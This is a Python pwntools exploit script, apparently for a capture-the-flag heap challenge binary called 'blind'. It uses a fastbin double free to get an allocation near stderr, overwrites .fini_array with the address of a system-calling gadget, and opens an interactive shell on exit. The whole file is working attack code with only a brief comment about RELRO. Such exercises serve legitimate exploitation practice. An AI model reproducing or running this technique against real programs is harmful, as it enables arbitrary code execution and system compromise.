#!/usr/bin/env python

'''
bad address of fini_array?
strange?
When relro is on, we can't overwrite .fini_array segment?
Obsolutely we can't.
'''
from pwn import *
import sys

debug = 0

if len(sys.argv) == 2:
	p = remote('', 0)
if len(sys.argv) == 1:
	p = process('./blind')
if len(sys.argv) == 3:
	p = process('./blind')
	debug = 1

def new(index, content):
	p.sendlineafter("Choice:", str(1))
	p.sendlineafter("Index:", str(index))
	p.sendlineafter("Content:", content)

def change(index, content):
	p.sendlineafter("Choice:", str(2))
	p.sendlineafter("Index:", str(index))
	#sleep(1)
	p.sendlineafter("Content:", content)

def release(index):
	p.sendlineafter("Choice:", str(3))
	p.sendlineafter("Index:", str(index))

stderr = 0x602040
fini_array = 0x601DB8+8
call_system = 0x4008E3

new(0, "aaaa")
new(1, "bbbb")

release(0)
release(1)
release(0)

new(2, "dddd")

change(2, p64(stderr-3))
new(3, "eeee")
new(4, "ffff")
new(5, "gggg")

change(5, 'aaa' + 'a'*0x38 + p64(fini_array))
if debug:
	gdb.attach(p)
raw_input("go")
change(5, p64(call_system))

p.sendlineafter("Choice:", str(4))

p.interactive()
